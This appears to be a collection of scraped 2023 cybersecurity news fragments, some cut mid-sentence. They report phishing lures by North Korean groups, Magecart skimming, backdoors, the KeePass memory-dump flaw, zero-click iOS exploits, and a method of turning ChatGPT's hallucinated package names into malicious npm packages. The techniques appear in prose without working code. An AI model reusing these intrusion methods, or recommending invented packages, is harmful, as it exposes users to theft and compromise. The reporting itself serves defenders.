with sharing content online, particularly on social media platforms like TikTok and Snapchat that are popular communication methods for young people.Adults, too, should generally \"use discretion when posting images, videos, and personal content online, particularly those that include children or their information,\" the agency said. They also should run frequent searches of their own and their children's personal info — including full name, address, phone number etc. — to help identify the exposure and spread of personal information on the Internet.Applying strict privacy settings on social-media accounts to limit public exposure of personal and private images and information also can help people avoid targeting by sextortionists, the agency said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Key Findings:In late April 2023, X-Force uncovered several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns operated by ITG10. X-Force assesses that the documents are likely decoys geared toward various personnel within two subsets of activity: South Korean government, communication, and educational centers; and energy, manufacturing, and supply chain. This section provides analysis of the lure documents and potential targets.The first suspected subset of activity revealed Korean-language lure documents. The first titled (0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip [(0722) List of Standing Committee and Standing Special Committee members (final).zip)], contains charts listing the Standing Committee members and assignments associated with broadcast media in South Korea as of July 2022. Examination of the contents suggests that it is a directory of eighteen South Korean parliamentary committee assignments, the number of committee members, their names, and political party affiliation. Committees include Education and Judicial, International and Foreign Affairs, Defense, and Intelligence. The intended targets for this lure are likely to be parliamentary members seeking information on their committee assignment or reporters covering parliament.(0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip2023년도 4월 29일 세미나.pdf ISO filesThe ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file. The LNK file contains a PowerShell command, as seen below as an example. Once the LNK file is executed, it extracts and drops a decoy file, and a batch file within the user’s %TEMP% folder. In this instance, the files were 2023년도 4월 29일 세미나.pdf – decoy file, and 230415.bat.icon_location = C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exePowerShell Commands:While researching the RokRAT-related files, X-Force also uncovered three LNK files that behave differently than expected. There is no use of OneDrive or similar cloud applications to host a second-stage payload, and instead of dropping a batch file, these LNK files drop VBS, with the obfuscation technique for the dropped files being hex-encoding vs. string concatenation. In addition, the RokRAT LNK files drop batch files and downloads the payload that is decoded using the first byte as a key, then the payload is executed using Windows API functions (VirtualProtect). With these additional LNK files, the VBS downloaders do not perform these actions.The LNK files analyzed contain an encoded PowerShell, and once the LNK files are executed, the PowerShell script is run, and two files are dropped to the user’s %TEMP% folder. In one analyzed sample, the files dropped were a VBS file (tmp<random-9-digit-number>.vbs ), and a Plaintext file with contents asdfgqwert. The VBS file will get executed via Wscript.exe:“C:\\Windows\\System32\\WScript.exe” “C:\\Users\\Usuario\\AppData\\Local\\Temp\\tmp<nine-digit-number>.vbs”.  Wscript.exe is a service Encoded PowerShell:Decoded PowerShell:tmp1698268529.vbsGET requests:Proof of digital assets JPEGMultiple lure documents uncovered in this campaign suggest ITG10 continues to target individuals and organizations involved in foreign policy, potentially related to shifts in the geopolitical and security environment on the Korean peninsula.

      "title": "Kimsuky Strikes Again | New Social Engineering Campaign Aims to Steal Credentials and Gather Strategic Intelligence - SentinelOne",
      "text": " Kimsuky, a suspected North Korean advanced persistent threat (APT) group whose activities align with the interests of the North Korean government, is known for its global targeting of organizations and individuals. Operating since at least 2012, the group often employs targeted phishing and social engineering tactics to gather intelligence and access sensitive information.A hallmark of the activity we discuss in this post is Kimsuky’s focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities. As part of their initial contact strategy, the group impersonated Chad O’Carroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.]pro, which closely resembles the legitimate NK News domain nknews.org. The initial email requests the review of a draft article analyzing the nuclear threat posed by North Korea.Further, Kimsuky’s objective extends to the theft of subscription credentials from NK News. To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site. The login form that is presented to the target is designed to capture entered credentials.This Kimsuky activity indicates the group’s growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations, including the delivery of malware. Their approach highlights the group’s commitment to creating a sense of rapport with the individuals they target, potentially increasing the success rate of their subsequent malicious activities.By actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea, Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea, such as the country’s military activities. These actions are probably part of their broader objective to gather strategic intelligence, contributing to North Korea’s decision-making processes.We observed Kimsuky distributing an HTML-formatted phishing email to selected individuals, which requests the review of a draft article analyzing the nuclear threat posed by North Korea. The email primarily aims to initiate a subsequent conversation and is intentionally designed to appear benign: It impersonates NK News leadership and lacks any malicious artifacts.If the target engages in the conversation, Kimsuky eventually follows up with an email that contains an URL to a Google document.If the target is not responsive, Kimsuky follows up with a reminder email in an attempt to engage the target in conversation.The URL’s destination is manipulated through the spoofing technique of setting the href HTML property to direct to a website created by Kimsuky. This method, commonly employed in phishing attacks, creates a discrepancy between the perceived legitimacy of the link (a genuine Google document) and the actual website visited upon clicking the URL.The displayed URL to a Google document points to an actual article hosted on Google Docs, delving into the topic of the North Korean nuclear threat. The article contains visible edits to give the impression of a genuine draft article, aligning with Kimsuky’s luring tactic.The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such asThe Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target’s email address.This serves as a means of transporting the target’s address to the fake Google Docs site, which enables the site to dynamically display the address, creating a personalized and convincing appearance of legitimacy. The design and functionality of this site suggest its potential for reuse in targeting different individuals.We were unable to analyze the functionality behind the Request access web element as the group has taken down the site. However, given the theme of the site, we suspect that it has been designed to capture entered Google credentials.We also observed Kimsuky attempting to steal credentials for the subscription service of NK News, which is known for its comprehensive expert analyses and news reports. Gaining access to such reports would provide Kimsuky with valuable insights into how the international community assesses and interprets developments related to North Korea, contributing to their broader strategic intelligence-gathering initiatives.In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service. The emails prompt the recipients to confirm their NK News accounts under the pretext of recent security updates.The fake login site, hosted at https[://]www.nknews[.]pro/ip/register/, features a login form with the standard web elements, such as Sign In, Sign Up, and Forgot Password? buttons. When clicked, the Sign In button executes the loginAct JavaScript function, whereas the rest of the buttons do not conduct any activities.The JavaScript code captures entered credentials by issuing an HTTP POST request to https[://]www.nknews[.]pro/ip/register/login[.]php and then redirects the user to the legitimate NK News site.The main website hosted at https[://]www.nknews[.]pro redirects to the legitimate NK News site, https://nknews.org, and uses a certificate issued by Sectigo:SentinelLabs remains actively engaged in monitoring the activities conducted by Kimsuky. The findings presented in this post highlight the group’s persistent commitment to targeted social engineering attacks and underscore the need for increased awareness and understanding of Kimsuky’s tactics among potential targets.

      "title": "Researchers Spot a Different Kind of Magecart Card-Skimming Campaign",
      "text": " An attacker under the Magecart umbrella has infected an unknown number of e-commerce sites in the US, UK, and five other countries with malware for skimming credit card numbers and personally identifiable information (PII) belonging to people making purchases on these sites. But in a new wrinkle, the threat actor is also using the same sites as hosts for delivering the card-skimming malware to other target sites.They assess that the cyberattacks have been going on for at least one month and have potentially affected tens of thousands of people already. Akamai said that in addition to the US and UK, it has spotted websites affected by the campaign in Brazil, Spain, Estonia, Australia, and Peru.Akamai counted Magecart attacks on 9,200 e-commerce sites last year, of which 2,468 remained infected as of the end of 2022.The typical modus operandi for these groups has been to surreptitiously inject malicious code into legitimate e-commerce sites — or into third-party components such as trackers and shopping carts — that the sites use, by exploiting known vulnerabilities. When users enter credit card information and other sensitive data on the checkout page of compromised websites, the skimmers silently intercept the data and send it to a remote server. So far, attackers have primarily targeted sites running the open source Magento e-commerce platform in Magecart attacks.The latest campaign is slightly different in that the attacker is not just injecting a Magecart card skimmer into target sites but is also hijacking many of them to distribute malicious code. \"One of the primary advantages of utilizing legitimate website domains is the inherent trust that these domains have built over time,\" according to the Akamai analysis. \"Security services and domain scoring systems typically assign higher trust levels to domains with a positive track record and a history of legitimate use. As a result, malicious activities conducted under these domains have an increased chance of going undetected or being treated as benign by automated security systems.\"In addition, the attacker behind the latest operation has also been attacking sites running not just Magento but other software, such as WooCommerce, Shopify, and WordPress.\"One of the most notable parts of the campaign is the way the attackers set up their infrastructure to conduct the web skimming campaign,\" Akamai researcher Roman Lvovsky wrote in the blog post. \"Before the campaign can start in earnest, the attackers will seek vulnerable websites to act as 'hosts' for the malicious code that is used later on to create the web skimming attack.\"Akamai's analysis of the campaign showed the attacker using multiple tricks to obfuscate the malicious activity. For example, instead of injecting the skimmer directly into a target website, Akamai found the attacker injecting a small JavaScript code snippet into its webpages that then fetched the malicious skimmer from a host website. The attacker designed the JavaScript loader to look like Google Tag Manager, Facebook Pixel tracking code, and other legitimate third-party services, so it becomes hard to spot. The operator of the ongoing Magecart-like campaign also has been using Base64 encoding to obfuscate the URLs of compromised websites hosting the skimmer. \"The process of exfiltrating the stolen data is executed through a straightforward HTTP request, which is initiated by creating an IMG tag within the skimmer code,\" Lvovsky wrote. \"The stolen data is then appended to the request as query parameters, encoded as a Base64 string.\"As a sophisticated detail, Akamai also found code in the skimmer malware that ensured it did not steal the same credit card and personal information twice.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Hackers utilizing native Windows tools have managed to infect at least one US defense contractor with a novel backdoor, which could have paved the way for additional malware implantation or worse.\"Because it's through Windows PowerShell, PowerDrop essentially has full access to the computer,\" explains Kevin O'Connor, director of threat research at Adlumin. \"It runs with administrative privileges, and the attackers can issue any remote command they want.\"Overall, PowerDrop \"straddles the line between what you see from advanced persistent threats (APTs), and the more basic script kiddie stuff,\" O'Connor assesses. \"It has some unique security precautions to protect itself but it also in some ways messes those up.\"For example, to avoid making too much noise, PowerDrop splits any large messages sent to and from the target machine into multiple, smaller messages. It also encrypts its payloads. To do so, however, \"it uses a static key that doesn't ever change, to encrypt everything. And so it's really detectable,\" O'Connor says.As a result, O'Connor says, \"it looks like anything else that would be registered on the system, and it doesn't leave malicious files on the disk.\"Most importantly, PowerDrop isn't anything more than a PowerShell script.Beyond that, PowerShell affords significant powers over a Windows computer, whether the user wielding it is an IT manager or hacker. PowerDrop could have enabled its proprietors to operate at the admin level in the defense contractor's network, stealing data or executing commands almost without restraint.Thus far, PowerDrop has been confirmed only to have compromised one domestic aerospace company, and scant details are available on the actual attack.But, O'Connor qualifies, \"we've actually had reports of other users having found this — it looks like there may be a common piece of software that this is associated with — we just haven't been able to tie it down yet.\"For his part, O'Connor suggests a few more straightforward steps that aerospace organizations and similar high-value targets can take, such as whitelisting: only allowing trusted applications and processes to run on a system.Additionally, he says, organizations can \"make sure that they have script block logging enabled, which actually shows you the decoded PowerShell commands that are running,\" beyond just the command line arguments that encase them.Admins might also consider auditing WMI events. WMI, O'Connor points out, \"is really commonly used by malware as a way to persist these days. A lot of people aren't looking at those jobs. But if you go in, you can see how this malware registers itself as 'SYSTEMPOWERMANAGER', and … it's not system power managing.\" This and other precautions, together, might be enough to fend off a backdoor as clever but imperfect as PowerDrop.\"It's really cool stuff,\" O'Connor says, reflecting on his discovery. \"I've worked at the NSA for years, and I just love this kind of stuff.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

It is also possible to dump the password from RAM after KeePass is no longer running, although the chance of that working goes down with the time it's been since then.\"It's worth noting that successful exploitation of the flaw banks on the condition that an attacker has already compromised a potential target's computer. It also requires that the password is typed on a keyboard, and not copied from the device's clipboard.vdohney said the vulnerability has to do with how a custom text box field used for entering the master password handles user input. Specifically, it has been found to leave traces of every character the user types in the program memory.This leads to a scenario whereby an attacker could dump the program's memory and reassemble the password in plaintext with the exception of the first character. Users are advised to update to KeePass 2.54 once it becomes available.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

      "text": "  Google launched a “Priority 1” investigation into a Gmail security vulnerability after initially dismissing it as “intended behavior” that did not require a fix.With BIMI, a blue tick verification symbol is displayed on emails when the brand logo displayed as the sender’s avatar has been authenticated as matching the company claiming to be sending the email. BIMI is not exclusive to Google, rather it is part of ongoing efforts by a working group with a broad range of members who support the verification standard. The flaw brought to Google's attention only impacts its own implementation of BIMI.UPDATE (6/5 1:45pm ET): In a statement to SC Media sent after this report initially published Google said: “This issue stems from a third-party security vulnerability allowing bad actors to appear more trustworthy than they are. To keep users safe, we are requiring senders to use the more robust DomainKeys Identified Mail (DKIM) authentication standard to qualify for Brand Indicators for Message Identification (blue checkmark) status.”“This will help users identify messages from legitimate senders versus impersonators,” Google said.“Strong email authentication helps users and email security systems identify and stop spam, and also enables senders to leverage their brand trust. This increases confidence in email sources and gives readers an immersive experience, creating a better email ecosystem for everyone.”Less than a month after rolling out BIMI across the platforms, New Hampshire security architect Chris Plummer received a malicious spoofed email in his Google inbox that had been incorrectly check-marked to indicate it was sent by UPS.“How is a scammer impersonating @UPS in such a convincing way ‘intended’[?] he wrote. “The sender found a way to dupe @gmail’s authoritative stamp of approval, which end users are going to trust. This message went from a Facebook account, to a UK netblock, to O365, to me. Nothing about this is legit.”After his tweet went viral, Google’s security team contacted Plummer to say they had had a change of heart over his bug bounty claim.“After taking a closer look we realized that this indeed doesn't seem like a generic SPF vulnerability. Thus we are reopening this and the appropriate team is taking a closer look at what is going on,” their message said.“We apologize again for the confusion and we understand our initial response might have been frustrating, thank you so much for pressing on for us to take a closer look at this!”Commenting on Plummer’s posts, one Twitter user said the problem appeared to be that UPS’s main domain had an SPF record and the spoofer had circumvented that protection by using a related subdomain.“That subdomain don't have a SPF record, and SPF is not meant to be inherited by subdomains. Perhaps it falls between the cracks because they're using a subdomain.”“It passed DMARC because UPS use Microsoft for email (and it’s in their SPF record), so you just need to send it from any Microsoft account.”Another commenter said: “Gmail can't fix the fact that [Microsoft] knowingly delivered [an email] that it KNEW failed SPF and DMARC.”“It was interesting that they were so bold in putting their own name on some of these communications [about the security benefits of the BIMI feature] when it relies on imperfect standards that are not within Google’s control.”He said he learned on June 2, via LinkedIn, that UPS had taken action as a result of him raising the vulnerability with Google.“That is unbelievable,” he said. “That’s an all-hands-on-deck kind of situation. I couldn’t believe the research I did compelled a company like UPS to change its infrastructure and actually got Google interested in changing its product.”Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": " Freelance JournalistA new cyber-attack technique using the OpenAI language model ChatGPT has emerged, allowing attackers to spread malicious packages in developers' environments.\"We've seen ChatGPT generate URLs, references and even code libraries and functions that do not actually exist. These large language model (LLM) hallucinations have been reported before and may be the result of old training data,\" explains the technical write-up by researcher Bar Lanyado and contributors Ortal Keizman and Yair Divinsky.By leveraging the code generation capabilities of ChatGPT, attackers can then potentially exploit fabricated code libraries (packages) to distribute malicious packages, bypassing conventional methods such as typosquatting or masquerading.In particular, Lanyado said the team identified a new malicious package spreading technique they called \"AI package hallucination.\"The technique involves posing a question to ChatGPT, requesting a package to solve a coding problem, and receiving multiple package recommendations, including some not published in legitimate repositories. By replacing these non-existent packages with their own malicious ones, attackers can deceive future users who rely on ChatGPT's recommendations. A proof of concept (PoC) utilizing ChatGPT 3.5 illustrates the potential risks involved.\"In the PoC, we will see a conversation between an attacker and ChatGPT, using the API, where ChatGPT will suggest an unpublished npm package named arangodb,\" the Vulcan Cyber team explained.\"Following this, the simulated attacker will publish a malicious package to the NPM repository to set a trap for an unsuspecting user.\"Next, the PoC shows a conversation where a user asks ChatGPT the same question and the model replies by suggesting the initially non-existent package. However, in this case, the attacker has transformed the package into a malicious creation.\"Finally, the user installs the package, and the malicious code can execute.\"Detecting AI package hallucinations can be challenging as threat actors employ obfuscation techniques and create functional trojan packages, according to the advisory.To mitigate the risks, developers should carefully vet libraries by checking factors such as creation date, download count, comments and attached notes. Remaining cautious and skeptical of suspicious packages is also crucial in maintaining software security."

Cybersecurity experts were mobilized to help gradually restore their operations.“Regarding education services, technical solutions are being set up to restore internet access to colleges and high schools. School administrators and the government are coordinating in order to ensure the smooth handling of exams.

However, in the background, the trojan could be used to steal files and replace clipboard contents.CloudSEK used the IoCs provided in Dr. Web’s report to uncover more SpinOk infections, extending the list of bad apps to 193 after discovering an additional 92 apps. Roughly half of those were available on Google Play.The most downloaded of the new batch was HexaPop Link 2248, which had 5 million installations. However, it has been removed from Google Play since CloudSEK compiled its report.Other popular apps using the SpinOk SDK and which remain available for download via Google Play are:CloudSEK reports that the collective download count for the additional SpinOK-ridden apps reaches over 30,000,000.It should be noted that the developers of these apps likely used the malicious SDK thinking it was an advertising library, unaware that it included malicious functionality.This is a testament to the complexity of fully mapping supply chain attacks in large software distribution platforms such as the Google Play store, where locating every project that might be using a particular module is challenging and leads to severe delays in the risk remediation process.CloudSEK informed Google about the new malicious apps it discovered on Friday, June 2, 2023, and BleepingComputer contacted the Android team about it.Google has not responded yet, and many of the apps listed in CloudSEK’s report are still available on Google Play at the time of writing.Update 6/6 - A Google spokesperson has sent us the following comment:The safety of users and developers is at the core of Google Play. We have reviewed recent reports on SpinOK SDK and are taking appropriate action on apps that violate our policies.Users are also protected by Google Play Protect, which warns users of apps known to exhibit malicious behavior on Android devices with Google Play Services, even when those apps come from other sources."

These measures are designed to detect and prevent any possible malicious activities, providing users with enhanced protection:\n1. Signature Verification: GIGABYTE has bolstered the validation process for files downloaded from remote servers. This enhanced verification ensures the integrity and legitimacy of the contents, thwarting any attempts by attackers to insert malicious code.\n2. Privilege Access Limitations: GIGABYTE has enabled standard cryptographic verification of remote server certificates. This guarantees that files are exclusively downloaded from servers with valid and trusted certificates, ensuring an added layer of protection.\" - GIGABYTE.While the risks from these vulnerabilities is likely low, all GIGABYTE motherboard users are advised to install the latest firmware updates to benefit from the security fixes.Furthermore, if you wish to remove the GIGABYTE auto-update application, you should first turn off the 'APP Center Download & Install Configuration' setting in the BIOS and then uninstall the software in Windows."

When opening the database in the future, users are required to enter this master key to decrypt it and access the credentials stored within it.\"For example, when \"Password\" is typed, it will result in these leftover strings: •a, ••s, •••s, ••••w, •••••o, ••••••r, •••••••d.\"This dumper allows users to recover almost all master password characters apart from the first one or two, even if the KeePass workspace is locked or the program was closed recently.Information-stealing malware or threat actors could use this technique to dump the program's memory and send it and the KeePass database back to a remote server for offline retrieval of the cleartext password from the memory dump. Once the password is retrieved, they can open the KeePass password database and access all the saved account credentials.KeePass's creator and main developer, Dominik Reichl, acknowledged the flaw and promised to release a fix soon, having already implemented an effective solution being tested in beta builds.Users of KeePass 1.x, Strongbox, or KeePassXC are not impacted by CVE-2023-32784 and, thus, do not need to migrate to a newer release.To fix the vulnerability, KeePass is now using a Windows API to set or retrieve data from text boxes, preventing the creation of managed strings that can potentially be dumped from memory.Reichl also introduced \"dummy strings\" with random characters into the memory of the KeePass process to make it harder to retrieve fragments of the password from memory and combine them into a valid master password.If the triggers, overrides, and profiles aren't stored in the enforced config because they were created using a previous version, they will be disabled automatically in 2.54, and users will have to manually activate them from the 'Tools' settings menu.Users who cannot upgrade to KeePass 2.54 are recommended to reset their master password, delete crash dumps, hibernation files, and swap files that might contain fragments of their master password, or perform a fresh OS install.Keep in mind that the issue impacts only passwords typed in the program's input forms, so if the credentials are copied and pasted into the boxes, no data-leaking strings are created in memory."

The CSS selectors were different for each targeted site, custom-made to match each victim.The second skimmer variant was not as well protected, exposing indicators in the code that helped Akamai map the campaign's reach and identify additional victims.After the skimmers steal the customers' details, the data is set to the attacker's server via an HTTP request created as an IMG tag within the skimmer.A layer of Base64 encoding is applied to the data to obfuscate the transmission and minimize the likelihood of the victim discovering the breach.Website owners can defend against Magecart infections by appropriately protecting website admin accounts and applying security updates for their CMS and plugins.Customers of online shops can minimize the risk of data exposure by using electronic payment methods, virtual cards, or setting charge limits to their credit cards."

      "text": " Russian cybersecurity firm Kaspersky says some iPhones on its network were hacked using an iOS vulnerability that installed malware via iMessage zero-click exploits.The delivery of the message exploits a vulnerability that leads to code execution without requiring any user interaction, leading to the download of additional malicious from the attackers' server.Subsequently, the message and attachment are wiped from the device. At the same time, the payload stays behind, running with root privileges to collect system and user information and execute commands sent by the attackers.While the malware attempts to delete traces of the attack from devices, it still leaves signs of infection, like system file modifications that prevent the installation of iOS updates, abnormal data usage, and the injection of deprecated libraries.The analysis revealed that the first signs of infection happened in 2019, and the most recent iOS version that was infected by the malicious toolset is 15.7.Note that the latest major iOS release is 16.5, which might already have fixed the vulnerability used in these malware attacks.The exploit sent via iMessage triggers an unknown vulnerability in iOS to perform code execution, fetching subsequent stages from the attacker's server, including privilege escalation exploits.The security firm has provided a list of 15 domains associated with this malicious activity, which security admins can use to check historical DNS logs for possible signs of exploitation on their devices.After root privilege escalation, the malware downloads a fully-featured toolset that executes commands for collecting system and user information and downloading additional modules from the C2.Kaspersky notes that the APT toolset dropped on the device has no persistence mechanisms, so a reboot would effectively stop it.At this time, only a few details about the functions of the malware were made public, as the analysis of the final payload is still underway.In a statement coinciding with Kaspersky's report, Russia's FSB intelligence and security agency claims that Apple deliberately provided the NSA with a backdoor it can use to infect iPhones in the country with spyware.Despite the seriousness of the allegations, the FSB has provided no proof of its claims.Kaspersky confirmed to BleepingComputer that the attack impacted its headquarters office in Moscow and employees in other countries. Still, the company stated it's in no position to verify a link between its finding and FSB's report, as they do not have the technical details of the government's investigation.BleepingComputer has contacted Apple to request a comment on both Kaspersky's findings and FSB's allegations, but we are still waiting to receive a response.Update 6/2 - An Apple spokesperson has sent BleepingComputer the following comment: We have never worked with any government to insert a backdoor into any Apple product and never will."

      "text": "  A critical zero-day vulnerability in Progress Software’s MOVEit Transfer file transfer application could have a broad impact — leading to escalated privileges and potential unauthorized access to millions of IT environments. John Hammond, senior security researcher at Huntress, explained that MOVEit is managed file transfer software that uses multiple protocols to share data securely in an automated manner. Hammond said potential use cases include a university that desires potential students to upload their application online in a secure manner. Another good example: a financial institution that requires customers to upload their data to apply for a loan.\"If this MOVEit transfer is exposed to the internet — as Shodan suggests 2,500 devices are — it’s likely that it could have been compromised during the Memorial Day weekend, or perhaps even earlier,\" said Hammond. “We know that there have been cases of data exfiltration for affected victims, and the deployed backdoor we’ve seen in this campaign offers persistent access to the threat actor. Without cleaning up the intrusion, the adversary can potentially steal Azure account information or continue operations later.\"Charles Carmakal, CTO at Mandiant Consulting at Google Cloud, added that Mandiant has been investigating several intrusions related to the exploitation of the MOVEit managed file transfer zero-day vulnerability. Carmakal said mass exploitation and broad data theft has occurred over the past few days.“In addition to patching their systems, any organization using MOVEit should forensically examine the system to determine if it was already compromised and if data was stolen,” said Carmakal. “Although Mandiant does not yet know the motivation of the threat actor, organizations should prepare for potential extortion and publication of the stolen data. Mass exploitation of zero-day vulnerabilities with other managed file transfer solutions have resulted in data theft, extortion, publication of stolen data, and victim shaming.\"November 2, 2023Singaporean luxury resort and casino Marina Bay Sands had data from nearly 665,000 customers compromised following a cyber incident between Oct. 19 and 20, BleepingComputer reports.NBC News reports that sensitive personal data from U.S. military personnel is not only prevalently advertised online but also cheap to obtain, with Duke University Sanford School of Public Policy researchers being able to purchase information belonging to nearly 50,000 U.S. service members from data brokers for only a little over $10,000.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  The Russian embassy in Berlin is seen. The Russian government claims a mobile malware campaign uncovered by Kaspersky was directed by the U.S. government and also targeted their embassy staff and a range of other countries. (Credit: Terroa via Getty Images)Kaspersky researchers say they have uncovered a mobile malware campaign targeting their researchers the same day that Russian intelligence services referenced the report to accuse the U.S. government and Apple of collaborating to place backdoors in Apple mobile phones.\"Basically, the phone was connecting to the servers getting the attachment or iMessage, and then the next minute the phone started connecting to some weird suspicious domain. So we started looking more into that and ... we were able to recover this APT platform that was being delivered to the devices,\" Igor Kuznetsov, head of EEMEA at Kaspersky's Global Research and Analysis Team, told SC Media Thursday. According to Kuznetsov, the first exploit provides initial access and compromise, while the second gives an attacker kernel-level access to the device. The individuals targeted were not just security researchers but also managers and other top executives at the firm.\"It gains complete root access over the phone — basically all the sensors, the microphone, the screen, all the data on the phone — and it starts getting the commands from the server and doing whatever the operator wants,\" he said.Kaspersky is still investigating the final payload, but the company said they believe the activity has been going on for years.“The timelines of multiple devices indicate that they may be reinfected after rebooting. The oldest traces of infection that we discovered happened in 2019. As of the time of writing in June 2023, the attack is ongoing, and the most recent version of the devices successfully targeted is iOS 15.7,” the researchers wrote.“In the course of ensuring the security of the Russian telecommunications infrastructure, anomalies specific only to users of Apple mobile phones and caused by operation of previously unknown malicious software (VPO) that uses software vulnerabilities provided by the manufacturer,” the FSB wrote, according to a Google-translated transcript.To be clear, those claims go well beyond what is contained in Kaspersky's report on June 1, and Kuznetsov told SC Media they are not attributing the activity to any government or actor at this time, nor are they claiming that Apple was a willing participant in the scheme. Their analysis has been confined to the phones of internal employees and they have no information at this time about other individuals, organizations or countries that may have been targeted. He said when the company discovered the campaign, it notified the CERTs of countries around the world, including Russia, and only learned of the claims when the Russian CERT posted its own report.\"We are not attributing it to any actor at all, [and] for us it is a completely new, unknown actor,\" Kuznetsov said.However, founder Eugene Kaspersky also said on Twitter that: \"We are quite confident that Kaspersky was not the main target of this cyberattack.\"In a statement sent to SC Media, an Apple spokesperson categorically denied the accusations from the Russian government that they colluded with U.S. agencies, saying \"“we have never worked with any government to insert a backdoor into any Apple product and never will.”Taking the public claims of Russian intelligence or government services at face value can be treacherous, but the underlying research and comments from Kaspersky and Amnesty Tech lend credence to some the charges, though Kuznetsov made it clear that Kaspersky is not attributing this campaign to a specific actor or country, nor is it claiming that Apple collaborated with any party to deliberately place vulnerabilities into their devices.Kuznetsov said Kaspersky is continuing to investigate the chain of exploits, which he described as \"very, very complicated\" and identify specific parts of the operating system that were being targeted in the campaign.Correction: This story was updated to reflect Igor Kuznetsov's current title.Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "title": "Novel PyPI Malware Uses Compiled Python Bytecode to Evade Detection",
      "text": " In a new twist on software supply chain attacks, researchers have discovered a Python package hiding malware inside of compiled code, allowing it to evade ordinary detection measures.\"This behavior is a bit more sophisticated, and it shows that the attackers are evolving and paying attention to the better detections that are being rolled out,\" says Ashlee Benge, director of threat intelligence advocacy at ReversingLabs, adding that \"we're probably going to continue to see this kind of attack increase in the future.\"The genius of fshec2 is in how it dispenses with basic conventions of good hacker hygiene.For example, bad guys tend not to distribute overt malware out on the Web — that'd be ham-handed. Instead, they plant tools which, upon hooking into a target computer, connect back to their C2 servers and trigger the download of malicious code — that can be ransomware, an infostealer, you name it.By contrast, fshec2 front loaded its malicious functionalities, and didn't rely on obfuscation tools at all.The package contained three files — two unexceptional source code files, and a third, more interesting file, \"full.pyc.\" Within full.pyc was a method called \"get_path,\" which, the researchers explained, \"performs some of the common malicious functions observed in other malicious PyPI packages we have analyzed,\" including collecting usernames, hostnames, and directory listings, and downloading commands from a remote server.How did fshec2 manage to hide the maliciousness of get_path? The crucial bit here is that PYC files contain not source code, but compiled bytecode.Bytecode is a representation of Python, compiled as a set of instructions for the Python Virtual Machine. In a simplified sense, it exists somewhere between source code and being a machine binary.Raw bytecode isn't friendly to the human eye — get_path, for example, can't be found in readable form anywhere inside fshec2. And so it's also able to skirt by software scanners.PyPI doesn't yet account for malware hidden in bytecode, Benge explains, because \"over the last decade, these files have gotten increasingly more complicated and huge. It's really slow, often, to try to scan such a big file. So it creates this dilemma: how much lag do you want your user to experience?\"As for third-party security software, she adds, \"another problem is file type. I couldn't even tell you how many file types there are at this point — there are all sorts of obscure ones. And oftentimes, security solutions don't actually have the capabilities to look at the kinds less commonly seen.\"\"Right now, poor PyPI is really under fire,\" Benge remarks. \"There's been a huge increase in this type of attack generally, where we're seeing malicious Python libraries be leveraged to serve malware.\"Benge is optimistic about these developments. \"Now it becomes a little more difficult than just pushing a malicious library out to PyPI and waiting for someone to download it. Now we're seeing that these guys have to work a little harder.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  New research on a now patched zero-day bug in Barracuda Networks’ email security gateway, which went unpatched and exploited for months, reveals three previously unknown malicious payloads used in the attacks. Meanwhile, adversaries behind the cyberattack remain elusive.     \"If a customer has not received notice from us via the ESG user interface, we have no reason to believe their environment has been impacted at this time and there are no actions for the customer to take,\" advised Barracuda in a statement. It said evidence had been found that the vulnerability had been exploited as far back as October 2022. The exploit had allowed malware to be dropped on some of the appliances, enabling the attackers to gain persistent backdoor access.“Evidence of data exfiltration was identified on a subset of impacted appliances,” Barracuda said in the update.“The vulnerability stemmed from incomplete input validation of user supplied .tar (tape archive) files as it pertains to the names of the files contained within the archive. Consequently, a remote attacker could format file names in a particular manner that would result in remotely executing a system command through Perl's qx operator with the privileges of the Email Security Gateway product.”One of the three malware payloads identified so far had been labeled SaltWater and was described as a trojanized module for the Barracuda SMTP daemon (bsmtpd) that contained backdoor functionality. Its capabilities included uploading or downloading files, executing commands, and carry out proxying and tunneling activities.Mandiant was continuing to analyze SaltWater to determine if its characteristics overlapped with any known malware families, Barracuda said.The second payload, SeaSpy, was “an x64 ELF persistence backdoor that poses as a legitimate Barracuda Networks service and establishes itself as a PCAP (packet capture) filter, specifically monitoring traffic on port 25 (SMTP).”Mandiant’s analysis had identified shared code between SeaSpy and cd00r, a long-established publicly available backdoor.The third piece of malware, SeaSide, was a Lua-based module used to connect to the attackers’ command-and-control server to establish a reverse shell for accessing the system.Barracuda’s update provided details of indicators of compromise associated with the attack and YARA rules that could be applied by appliance operators to hunt for the malicious .tar files that exploited the 